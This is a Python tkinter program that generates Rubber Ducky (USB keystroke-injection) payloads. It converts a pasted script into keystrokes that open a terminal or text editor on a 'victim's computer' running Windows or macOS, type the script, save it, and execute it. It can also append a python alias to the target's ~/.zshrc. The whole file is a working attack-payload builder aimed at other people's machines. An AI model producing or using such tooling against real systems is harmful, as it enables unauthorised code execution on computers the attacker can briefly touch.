import tkinter as tk

#functions
def inject_python_code_in_terminal(code: str, name_file: str) -> str:
    # Add newline characters to the input code
    code = code.replace("\n", "\\n")
    return f"echo '{code}' > {name_file}"

def python_to_text_editor(commands, delay_before_script, explanation_of_script=None):
    string_list = ""
    if explanation_of_script == None:
        pass
    else:
        string_list += f"REM {explanation_of_script}\n"
    string_list += f"DELAY {delay_before_script}\n"
    for command in commands:
        string_list += f"STRING {command}\n"
        string_list += "ENTER\n"
    return string_list


def convert_list_to_string(list):
    multilateral_string = ""
    for item in list:
        multilateral_string += f"{item}\n"
    
    return multilateral_string

def add_executing_script_python3():
        if checkbox.get():
            text='REM adds this to have python command work with python3\nSTRING echo "alias python=/usr/bin/python3" >> ~/.zshrc\n\n'
        else:
            text=""
        return text
def delete_rem_and_empty_sentences(string):
    # Split the string into a list of sentences
    sentences = string.split("\n")
    # Initialize an empty list to store the non-empty, non-REM sentences
    filtered_sentences = []
    # Iterate over the sentences
    for sentence in sentences:
        # Check if the sentence is empty or starts with "REM" and skip it if either condition is True
        if sentence == "" or sentence.startswith("REM"):
            continue
        # If the sentence passes the checks, append it to the list of filtered sentences
        filtered_sentences.append(sentence)
    # Join the filtered sentences into a single string and return it
    return "\n".join(filtered_sentences)

# Create the main window
root = tk.Tk()
root.title("Script injection using Ducky")




# Create a StringVar to store the value of the selected radio button
selection = tk.StringVar()
selection_text_editor = tk.StringVar()

def copy_text():
    text = output_field.get("1.0", "end-1c")
    root.clipboard_clear()
    root.clipboard_append(text)

def save_to_payload():
    text = output_field.get("1.0", "end-1c")
    with open("payload.dd", "w") as f:
        f.write(text)

def convert_to_ducky():
    # Get the text from the input field
    input_text = input_field.get("1.0", "end")
    
    # Split the input text into lines
    lines = input_text.split("\n")
    
    # Initialize the output text
    output_text = ""
    selection_value = selection.get()

    selection_text_editor_got = selection_text_editor.get()
    delay = delay_entry.get()

    filename = filename_entry.get()
    programming_language = programming_entry.get()


    

  
  
    # This script will open up finder to look for appropiate app
    if selection_value == 'Windows':
        # Add the execution script to the output text
        output_text += "REM Opens Windows search bar\n"
        output_text += f"DELAY {delay}\n"
        output_text += "GUI r\n\n"
         

    elif selection_value == 'Mac_os':
        output_text += "REM Opens Mac spotlight search\n"
        output_text += f"DELAY {delay}\n"
        output_text += "COMMAND SPACE\n\n"
         
    else:
        output_text += "Error with button system"


    #Navigate to text editor of choice
    if selection_text_editor_got == "Terminal":
        output_text += "REM Opens Terminal\n"
        output_text += f"DELAY {delay}\n"
        output_text += "STRING Terminal\n"
        output_text += "ENTER\n"
        output_text += f"DELAY {delay}\n\n"
        

    elif selection_text_editor_got == "Nano":
        output_text += "REM Opens Nano editor\n"
        output_text += f"DELAY {delay}\n"
        output_text += "STRING Nano\n"
        output_text += "ENTER\n"
        output_text += f"DELAY {delay}\n\n"

    elif selection_text_editor_got == "Notepad":
        output_text += "REM Opens Notepad editor\n"
        output_text += "STRING Notepad\n"
        output_text += "ENTER\n"
        output_text += f"DELAY {delay}\n\n"



        

        
    
    # Iterate through each line and add "STRING" in front of it if the line is not empty

    if selection_text_editor_got != "Terminal":
        output_text += "REM Write python script that is injected\n"
        output_text += f"DELAY {delay}\n"
        for line in lines:
    
            if line:
                output_text += "STRING " + line + "\n"
                output_text += "ENTER" + "\n"
        output_text += "\n"
        
    
    #Save the file and exit back to terminal

    if selection_value == 'Windows':

        if selection_text_editor_got == "Nano":
            output_text += f"REM Saves Nano file as {filename}\n"
            output_text += "CONTROL x\n"
            output_text += f"DELAY {delay}\n"
            output_text += "STRING y\n"
            output_text += f"DELAY {delay}\n"
            output_text += f"STRING {filename}\n"
            output_text += "ENTER\n\n"
        elif selection_text_editor_got == "Notepad":
            output_text += f"REM Saves notepad-file as {filename}\n"
            output_text += f"DELAY {delay}\n"
            output_text += "CTRL s\n"
            output_text += f"DELAY {delay}\n"
            output_text += "STRING hello.py\n"
            output_text += "ENTER\n"
            output_text += f"DELAY {delay}\n"
            output_text += "ALT f\n"
            output_text += f"DELAY {delay}\n\n"
        
        if selection_text_editor_got == "Terminal":
            output_text += f"REM Saves file as {filename}\n"
            output_text += f"STRING {inject_python_code_in_terminal(convert_list_to_string(lines), filename)}\n"
            output_text += "ENTER\n\n"


    
    elif selection_value == 'Mac_os':


        if selection_text_editor_got == "Nano":
            output_text += "CONTROL x\n"
            output_text += f"DELAY {delay}\n"
            output_text += "STRING y\n"
            output_text += f"DELAY {delay}\n"
            output_text += f"STRING {filename}\n"
            output_text += "ENTER\n"
            output_text += f"DELAY {delay}\n\n"
            

        elif selection_text_editor_got == "Notepad":
            output_text += "REM Saves notepad-file as hack.txt\n"
            output_text += f"DELAY {delay}\n"
            output_text += "COMMAND s\n"
            output_text += f"DELAY {delay}\n"
            output_text += "STRING hello.py\n"
            output_text += "ENTER\n"
            output_text += f"DELAY {delay}\n"
            output_text += "ALT f\n"
            output_text += f"DELAY {delay}\n\n"
        if selection_text_editor_got == "Terminal":
            output_text += f"REM Saves file as {filename}\n"
            output_text += f"STRING {inject_python_code_in_terminal(convert_list_to_string(lines), filename)} \n"
            output_text += "ENTER\n\n"
    
    else:
        output_text += "error with button end"

    output_text += add_executing_script_python3()

    output_text += "REM Adds execute script\n"
    output_text += f"DELAY {delay}\n"
    output_text += f"STRING {programming_language} {filename}\n"
    output_text += "ENTER"

    if checkbox_delete_comments.get():
        output_text = delete_rem_and_empty_sentences(output_text)
    else:
        pass




    

    
    # Set the output text to the output field
    output_field.delete("1.0", "end")
    output_field.insert("1.0", output_text)



# Create the input field
input_field = tk.Text(root, width=50, height=20)
input_field.grid(column=0, row=2)

#Select title for input field middle
title_radio_button = tk.Label(root, text="Input script")
title_radio_button.grid(column=0, row=1)



# Create titles for the input fields left
filename_ = tk.Label(root, text="Enter filename")
filename_.grid(column=0, row=3)

#Create the input fields for file name title and 

filename_entry = tk.Entry(root, text="Choose filename")
filename_entry.insert(index=1, string="Injection.py")

#Set grid for input fields name and title
filename_entry.grid(column=0, row = 4)

#Create input for programming language
# Create titles for the input fields left
programming_language = tk.Label(root, text="Programming language used to execute in terminal")
programming_language.grid(column=0, row=5)

#Create the input fields for file name title and 
programming_language = "python"
programming_entry = tk.Entry(root, text="Choose programming language")
programming_entry.grid(column=0, row=6)
programming_entry.insert(index=1, string="python")

#Extra line to execute command with python3 installed
checkbox = tk.BooleanVar()
python3_runner_label = tk.Label(root, text="Helps fix issue with computers running python3").grid(column=0, row=9)
python3_runner = tk.Checkbutton(root, text='Adds echo "alias python=/usr/bin/python3" >> ~/.zshrc', variable=checkbox, command=add_executing_script_python3).grid(column=0, row=10)

#Deletes all empty spaces and comments from code
checkbox_delete_comments = tk.BooleanVar()
deletes_white_space = tk.Checkbutton(root, text='Deletes whitespaces and REM comments', variable=checkbox_delete_comments, command=delete_rem_and_empty_sentences).grid(column=0, row=11)

# Adds custom delay
delay_label = tk.Label(root, text="Delay used between steps").grid(column=0, row=7)
delay_entry = tk.Entry(root, text="Delay")
delay_entry.grid(column=0, row=8)
delay_entry.insert(index=1, string="100")



# Create two radio buttons, and set their variable to the StringVar
Windows = tk.Radiobutton(root, text='Windows', value='Windows', variable=selection)
Mac_os = tk.Radiobutton(root, text='Mac_os', value='Mac_os', variable=selection)


#Set a title for the two radio buttons
title_radio_button = tk.Label(root, text="Operating system victim's computer\n (is important as scripting will be different)")
title_radio_button.grid(column=1, row=5)

#pack the two radio buttons
Windows.grid(column=1, row=7)
Mac_os.grid(column=1, row=6)

#Select Windows as the standard choice
Mac_os.select()

#Set a title for the text editor of choice
title_radio_button = tk.Label(root, text="Text editor (choose to use which text editor\n you like to inject the python file)")
title_radio_button.grid(column=1, row=8)


# Create two radio buttons for the Text editor of choice
Terminal = tk.Radiobutton(root, text='Terminal', value='Terminal', variable=selection_text_editor)
Nano = tk.Radiobutton(root, text='Nano', value='Nano', variable=selection_text_editor)
Notepad = tk.Radiobutton(root, text='Notepad', value='Notepad', variable=selection_text_editor)


#pack the two editor radio buttons
Terminal.grid(column=1, row=9)
Nano.grid(column=1, row=10)
Notepad.grid(column=1, row=11)


#Set default for Nano
Terminal.select()

# Create the convert button
convert_button = tk.Button(root, text="Convert", command=convert_to_ducky)
convert_button.grid(column=1, row=2)

#Create the coppy button
coppy_button = tk.Button(root, text="Copy ducky script", command=copy_text)
coppy_button.grid(column=1, row=3)

#Create the save as payload.dd button
save_payload_button = tk.Button(root, text="Save as payload.dd", command=save_to_payload)
save_payload_button.grid(column=1, row=4)
#Select title for output field
title_radio_button = tk.Label(root, text="Output ducky script")
title_radio_button.grid(column=3, row=1)

# Create the output field
output_field = tk.Text(root, width=50, height=20)
output_field.grid(column=3, row=2)

# Start the main loop
root.mainloop()





